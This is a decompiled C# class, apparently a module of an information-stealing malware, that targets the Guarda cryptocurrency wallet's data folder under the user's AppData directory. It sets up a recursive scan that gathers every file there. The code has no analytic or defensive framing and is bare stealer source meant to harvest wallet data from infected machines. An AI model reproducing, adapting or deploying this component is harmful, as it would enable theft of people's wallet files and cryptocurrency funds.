using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x0200001F RID: 31
public class GuardaRule : FileScannerRule
{
	// Token: 0x0600007D RID: 125 RVA: 0x0000605C File Offset: 0x0000425C
	public GuardaRule()
	{
		base.Name = "Guarda";
	}

	// Token: 0x0600007E RID: 126 RVA: 0x00004F07 File Offset: 0x00003107
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x0600007F RID: 127 RVA: 0x00006070 File Offset: 0x00004270
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Guarda";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*",
				Recoursive = true
			});
		}
		catch
		{
		}
		return list;
	}
}
